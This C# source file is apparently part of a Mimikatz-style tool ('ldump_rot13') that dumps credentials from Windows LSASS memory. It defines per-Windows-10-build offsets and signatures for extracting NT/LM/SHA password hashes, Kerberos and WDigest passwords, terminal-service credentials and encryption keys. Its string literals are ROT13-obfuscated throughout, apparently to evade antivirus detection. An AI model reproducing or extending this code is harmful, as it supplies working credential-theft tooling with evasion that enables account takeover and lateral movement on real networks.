//start
using System.Text;
using System.Linq;
using System;
﻿//

using ldump_rot13.WinBuild;
using System.Reflection;
using System.Runtime.InteropServices;
using static ldump_rot13.Module.Kerberos;
using static ldump_rot13.Module.Msv1;
using static ldump_rot13.Win32.Natives;

namespace ldump_rot13
{
    class OSVersionHelper
    {

        static public int KULL_M_WIN_BUILD_10_1507 = 10240;
        static public int KULL_M_WIN_BUILD_10_1511 = 10586;
        static public int KULL_M_WIN_BUILD_10_1607 = 14393;
        static public int KULL_M_WIN_BUILD_10_1703 = 15063;
        static public int KULL_M_WIN_BUILD_10_1803 = 17134;
        static public int KULL_M_WIN_BUILD_10_1809 = 17763;
        static public int KULL_M_WIN_BUILD_10_1903 = 18362;
        static public int KULL_M_WIN_BUILD_10_2004 = 19041;

        public byte[] logonSessionListSign { get; set; }

        public int LocallyUniqueIdentifierOffset { get; set; }
        public int LogonTypeOffset { get; set; }
        public int SessionOffset { get; set; }
        public int UserNameListOffset { get; set; }
        public int DomaineOffset { get; set; }
        public int CredentialsOffset { get; set; }
        public int pSidOffset { get; set; }
        public int CredentialManagerOffset { get; set; }
        public int LogonTimeOffset { get; set; }
        public int LogonServerOffset { get; set; }

        public int MSV1CredentialsOffset { get; set; }
        public int MSV1PrimaryOffset { get; set; }

        public int LogonDomainNameOffset { get; set; }
        public int UserNameOffset { get; set; }
        public int LmOwfPasswordOffset { get; set; }
        public int NtOwfPasswordOffset { get; set; }
        public int ShaOwPasswordOffset { get; set; }
        public int DPAPIProtectedOffset { get; set; }
        public int IsNtOwfPasswordOffset { get; set; }
        public int IsLmOwfPasswordOffset { get; set; }
        public int IsShaOwPasswordOffset { get; set; }
        public int IsIsoOffset { get; set; }
        public int IsDPAPIProtectedOffset { get; set; }

        public int LOGONSESSIONLISTOFFSET { get; set; }
        public int LOGONSESSIONSLISTCOUNTOFFSET { get; set; }

        public byte[] keyIVSig { get; set; }
        public long IV_OFFSET { get; set; }
        public long DES_OFFSET { get; set; }
        public long AES_OFFSET { get; set; }

        public byte[] logSessListSig { get; set; }
        public int USERNAME_OFFSET { get; set; }
        public int HOSTNAME_OFFSET { get; set; }
        public int PASSWORD_OFFSET { get; set; }

        public byte[] SspCredentialListSign { get; set; }
        public int CREDENTIALLISTOFFSET { get; set; }

        public byte[] LiveLocateLogonSession { get; set; }
        public int LIVESSPLISTOFFSET { get; set; }

        public byte[] KerbUnloadLogonSessionTableSign { get; set; }
        public int KerberosSessionUserNameOffset { get; set; }
        public int KerberosSessionDomaineOffset { get; set; }
        public int KerberosSessionPasswordOffset { get; set; }
        public int KerberosSessionLocallyUniqueIdentifierOffset { get; set; }
        public int KerberosSessionCredentialOffset { get; set; }
        public int KerbUnloadLogonSessionTableOffset { get; set; }
        public Type LogonSessionType { get; set; }
        public int LogonSessionTypeSize { get; set; }
        public Type KerberosLogonSessionType { get; set; }
        public Type KerberosHashType { get; set; }
        public int KerberosLogonSessionKeyListOffset { get; set; }
        public int KerberosHashGenericOffset { get; set; }
        public int KerberosOffsetPasswordErase { get; set; }
        public int KerberosPasswordEraseSize { get; set; }

        public byte[] TSGlobalCredTableSign { get; set; }
        public int TSGlobalCredTableOffset { get; set; }
        public int TSCredLocallyUniqueIdentifierOffset { get; set; }
        public int TSCredOffset { get; set; }
        public Type TSCredType { get; set; }

        public Type ListType { get; set; }
        public int ListTypeSize { get; set; }

        UInt32 major = 0;
        UInt32 minor = 0;
        public UInt32 build { get; set; }

        IWinBuild winbuild;

        IWinBuild[] winbuilds =
        {
            new WinBuild1507(),
            new WinBuild1511(),
            new WinBuild1607(),
            new WinBuild1703(),
            new WinBuild1803(),
            new WinBuild1809(),
            new WinBuild1903(),
            new WinBuild2004()
        };

        public OSVersionHelper()
        {
            UInt32 locbuild = 0;
            RtlGetNtVersionNumbers(out major, out minor, out locbuild);
            build = (locbuild & 0x00007fff);

            winbuild = GetWinBuild();

            ListType = winbuild.ListType;
            ListTypeSize = winbuild.ListTypeSize;
            LogonSessionType = winbuild.LogonSessionType;
            LogonSessionTypeSize = winbuild.LogonSessionTypeSize;
            TSCredType = winbuild.TSCredType;
            KerberosHashType = winbuild.KerberosHashType;
            KerberosLogonSessionType = winbuild.KerberosLogonSessionType;

            InitializeMSV1List();
            InitializeMSV1PrimaryCredentials();
            InitializeMSV1PrimaryCredential();
            InitializeMsv1Offset();
            InitializeLogonSessionListSign();
            InitializeLogSessListSig();
            InitializekeyIVSig();
            InitializeWDigestOffset();
            InitializeKeyOffset();
            InitializeSspOffset();
            InitializeSspCredentialListSign();
            InitializeLiveSspOffset();
            InitializeLiveSspCredentialListSign();
            InitializeKerbUnloadLogonSessionTableOffset();
            InitializeKerbUnloadLogonSessionTableCredentialListSign();
            InitializeKerberosPrimaryCredential();
            InitializeKerberosLogonSession();
            InitializeKerberosHash();
            InitializeKerberosSession();
            InitializeTSGlobalCredTableSign();
            InitializeTSGlobalCredTableOffset();
            InitializeTSCred();
        }

        public void PrintOSVersion()
        {
            Console.WriteLine(new string("[*]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            Console.WriteLine(new string("[*] \\g\\g\\gFlfgrz Vasbezngvba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            Console.WriteLine("[*] {0}", new string('-', 70));
            Console.WriteLine("[*] | Platform: {0,-57}|", System.Environment.OSVersion.Platform);
            Console.WriteLine("[*] {0}", new string('-', 70));
            Console.WriteLine("[*] | Major: {0,-14}| Minor: {1,-14}| Build: {2,-14}|", major, minor, build);
            Console.WriteLine("[*] {0}", new string('-', 70));
            Console.WriteLine("[*] | Version: {0,-58}|", System.Environment.OSVersion.VersionString);
            Console.WriteLine("[*] {0}", new string('-', 70));
            if (!string.IsNullOrEmpty(System.Environment.OSVersion.ServicePack))
            {
                Console.WriteLine("[*] | ServicePack: {0,-44}|", System.Environment.OSVersion.ServicePack);
                Console.WriteLine("[*] {0}", new string('-', 70));
            }
            Console.WriteLine(new string("[*]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        }

        private IWinBuild GetWinBuild()
        {

            var selection = winbuilds.Select((lbuild, index) => new { lbuild, index }).Where(x => x.lbuild.build <= build).Max(x => x.index);
            return winbuilds[selection];

        }

        private int MSV1PrimaryCredentialsFieldOffset(string field)
        {
            Type primaryCredentialType = winbuild.PrimaryCredentialsType;
            Type ex = typeof(Utility);
            MethodInfo mi = ex.GetMethod(new string("SvryqBssfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            MethodInfo miConstructed = mi.MakeGenericMethod(primaryCredentialType);

            object[] args = { field };
            return (int)miConstructed.Invoke(null, args);
        }

        private int MSV1PrimaryCredentialFieldOffset(string field)
        {
            Type primaryCredentialType = winbuild.PrimaryCredentialType;
            Type ex = typeof(Utility);
            MethodInfo mi = ex.GetMethod(new string("SvryqBssfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            MethodInfo miConstructed = mi.MakeGenericMethod(primaryCredentialType);

            object[] args = { field };
            return (int)miConstructed.Invoke(null, args);
        }

        private int MSV1ListFieldOffset(string field)
        {
            Type primaryCredentialType = winbuild.ListType;
            Type ex = typeof(Utility);
            MethodInfo mi = ex.GetMethod(new string("SvryqBssfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            MethodInfo miConstructed = mi.MakeGenericMethod(primaryCredentialType);

            object[] args = { field };
            return (int)miConstructed.Invoke(null, args);
        }

        private void InitializeMSV1List()
        {
            LocallyUniqueIdentifierOffset = MSV1ListFieldOffset(new string("YbpnyylHavdhrVqragvsvre".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            LogonTypeOffset = MSV1ListFieldOffset(new string("YbtbaGlcr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            SessionOffset = MSV1ListFieldOffset(new string("Frffvba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            UserNameListOffset = MSV1ListFieldOffset(new string("HfreAnzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            DomaineOffset = MSV1ListFieldOffset(new string("Qbznvar".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            CredentialsOffset = MSV1ListFieldOffset(new string("Perqragvnyf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            pSidOffset = MSV1ListFieldOffset(new string("cFvq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            CredentialManagerOffset = MSV1ListFieldOffset(new string("PerqragvnyZnantre".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            LogonTimeOffset = MSV1ListFieldOffset(new string("YbtbaGvzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            LogonServerOffset = MSV1ListFieldOffset(new string("YbtbaFreire".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        }

        private void InitializeMSV1PrimaryCredentials()
        {
            MSV1CredentialsOffset = MSV1PrimaryCredentialsFieldOffset(new string("Perqragvnyf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            MSV1PrimaryOffset = MSV1PrimaryCredentialsFieldOffset(new string("Cevznel".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        }

        private void InitializeMSV1PrimaryCredential()
        {
            LogonDomainNameOffset = MSV1PrimaryCredentialFieldOffset(new string("YbtbaQbznvaAnzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            UserNameOffset = MSV1PrimaryCredentialFieldOffset(new string("HfreAnzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            LmOwfPasswordOffset = MSV1PrimaryCredentialFieldOffset(new string("YzBjsCnffjbeq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            NtOwfPasswordOffset = MSV1PrimaryCredentialFieldOffset(new string("AgBjsCnffjbeq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            ShaOwPasswordOffset = MSV1PrimaryCredentialFieldOffset(new string("FunBjCnffjbeq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            IsNtOwfPasswordOffset = MSV1PrimaryCredentialFieldOffset(new string("vfAgBjsCnffjbeq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            IsLmOwfPasswordOffset = MSV1PrimaryCredentialFieldOffset(new string("vfYzBjsCnffjbeq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            IsShaOwPasswordOffset = MSV1PrimaryCredentialFieldOffset(new string("vfFunBjCnffjbeq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            IsIsoOffset = MSV1PrimaryCredentialFieldOffset(new string("vfVfb".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            

            if (winbuild.PrimaryCredentialType != typeof(MSV1_0_PRIMARY_CREDENTIAL_10_1607))
            {
                DPAPIProtectedOffset = 0;
                IsDPAPIProtectedOffset = 0;
            }
            else
            {
                DPAPIProtectedOffset = MSV1PrimaryCredentialFieldOffset(new string("QCNCVCebgrpgrq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                IsDPAPIProtectedOffset = MSV1PrimaryCredentialFieldOffset(new string("vfQCNCVCebgrpgrq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            }

            if (winbuild.PrimaryCredentialType == typeof(MSV1_0_PRIMARY_CREDENTIAL_10_1607))
            {
                LmOwfPasswordOffset -= 2;
                NtOwfPasswordOffset -= 2;
                ShaOwPasswordOffset -= 2;
            }
        }

        private int KerberosSessionFieldOffset(string field)
        {
            Type primaryCredentialType = winbuild.LogonSessionType;
            Type ex = typeof(Utility);
            MethodInfo mi = ex.GetMethod(new string("SvryqBssfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            MethodInfo miConstructed = mi.MakeGenericMethod(primaryCredentialType);

            object[] args = { field };
            return (int)miConstructed.Invoke(null, args);
        }

        private void InitializeKerberosSession()
        {
            KerberosSessionLocallyUniqueIdentifierOffset = KerberosSessionFieldOffset(new string("YbpnyylHavdhrVqragvsvre".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            KerberosSessionCredentialOffset = KerberosSessionFieldOffset(new string("perqragvnyf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            if(winbuild.KerberosPrimaryCredentialType == typeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL))
            {
                KerberosOffsetPasswordErase = KerberosSessionFieldOffset(new string("perqragvnyf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) + KerberosPrimaryCredentialFieldOffset(new string("hax0".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                KerberosPasswordEraseSize = winbuild.KerberosPrimaryCredentialTypeSize - KerberosPrimaryCredentialFieldOffset(new string("hax0".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            }
            else
            {
                KerberosOffsetPasswordErase = KerberosSessionFieldOffset(new string("perqragvnyf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) + KerberosPrimaryCredentialFieldOffset(new string("haxShapgvba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                KerberosPasswordEraseSize = winbuild.KerberosPrimaryCredentialTypeSize - KerberosPrimaryCredentialFieldOffset(new string("haxShapgvba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            }
        }

        private int KerberosPrimaryCredentialFieldOffset(string field)
        {
            Type primaryCredentialType = winbuild.KerberosPrimaryCredentialType;
            Type ex = typeof(Utility);
            MethodInfo mi = ex.GetMethod(new string("SvryqBssfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            MethodInfo miConstructed = mi.MakeGenericMethod(primaryCredentialType);

            object[] args = { field };
            return (int)miConstructed.Invoke(null, args);
        }

        private void InitializeKerberosPrimaryCredential()
        {
            KerberosSessionUserNameOffset = KerberosPrimaryCredentialFieldOffset(new string("HfreAnzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            KerberosSessionDomaineOffset = KerberosPrimaryCredentialFieldOffset(new string("Qbznvar".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            KerberosSessionPasswordOffset = KerberosPrimaryCredentialFieldOffset(new string("Cnffjbeq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        }

        private int KerberosLogonSessionFieldOffset(string field)
        {
            Type primaryCredentialType = winbuild.KerberosLogonSessionType;
            Type ex = typeof(Utility);
            MethodInfo mi = ex.GetMethod(new string("SvryqBssfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            MethodInfo miConstructed = mi.MakeGenericMethod(primaryCredentialType);

            object[] args = { field };
            return (int)miConstructed.Invoke(null, args);
        }

        private void InitializeKerberosLogonSession()
        {
            KerberosLogonSessionKeyListOffset = KerberosLogonSessionFieldOffset(new string("cXrlYvfg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        }

        private int KerberosHashFieldOffset(string field)
        {
            Type primaryCredentialType = winbuild.KerberosHashType;
            Type ex = typeof(Utility);
            MethodInfo mi = ex.GetMethod(new string("SvryqBssfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            MethodInfo miConstructed = mi.MakeGenericMethod(primaryCredentialType);

            object[] args = { field };
            return (int)miConstructed.Invoke(null, args);
        }

        private void InitializeKerberosHash()
        {
            KerberosHashGenericOffset = KerberosHashFieldOffset(new string("trarevp".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        }

        private int TSCredFieldOffset(string field)
        {
            Type primaryCredentialType = winbuild.TSCredType;
            Type ex = typeof(Utility);
            MethodInfo mi = ex.GetMethod(new string("SvryqBssfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            MethodInfo miConstructed = mi.MakeGenericMethod(primaryCredentialType);

            object[] args = { field };
            return (int)miConstructed.Invoke(null, args);
        }

        private void InitializeTSCred()
        {
            TSCredLocallyUniqueIdentifierOffset = TSCredFieldOffset(new string("YbpnyylHavdhrVqragvsvre".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            TSCredOffset = TSCredFieldOffset(new string("cGfCevznel".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        }

        private void InitializeLogonSessionListSign()
        {
            logonSessionListSign = winbuild.logonSessionListSign;
        }

        private void InitializeMsv1Offset()
        {
            LOGONSESSIONLISTOFFSET = winbuild.LOGONSESSIONLISTOFFSET;
            LOGONSESSIONSLISTCOUNTOFFSET = winbuild.LOGONSESSIONSLISTCOUNTOFFSET;
        }

        private void InitializeSspOffset()
        {
            CREDENTIALLISTOFFSET = winbuild.CREDENTIALLISTOFFSET;
        }

        private void InitializeSspCredentialListSign()
        {
            SspCredentialListSign = winbuild.SspCredentialListSign;
        }

        private void InitializeLiveSspOffset()
        {
            LIVESSPLISTOFFSET = winbuild.LIVESSPLISTOFFSET;
        }

        private void InitializeLiveSspCredentialListSign()
        {
            LiveLocateLogonSession = winbuild.LiveLocateLogonSession;
        }

        private void InitializeKerbUnloadLogonSessionTableOffset()
        {
            KerbUnloadLogonSessionTableOffset = winbuild.KerbUnloadLogonSessionTableOffset;
        }

        private void InitializeKerbUnloadLogonSessionTableCredentialListSign()
        {
            KerbUnloadLogonSessionTableSign = winbuild.KerbUnloadLogonSessionTableSign;
        }

        private void InitializeLogSessListSig()
        {
            logSessListSig = winbuild.logSessListSig;
        }

        private void InitializeTSGlobalCredTableSign()
        {
            TSGlobalCredTableSign = winbuild.TSGlobalCredTableSign;
        }

        private void InitializeTSGlobalCredTableOffset()
        {
            TSGlobalCredTableOffset = winbuild.TSGlobalCredTableOffset;
        }

        private void InitializekeyIVSig()
        {
            keyIVSig = winbuild.keyIVSig;
        }

        private void InitializeWDigestOffset()
        {
            USERNAME_OFFSET = 0x30;
            HOSTNAME_OFFSET = 0x40;
            PASSWORD_OFFSET = 0x50;

        }

        private void InitializeKeyOffset()
        {
            IV_OFFSET = winbuild.IV_OFFSET;
            DES_OFFSET = winbuild.DES_OFFSET;
            AES_OFFSET = winbuild.AES_OFFSET;

        }
    }
}
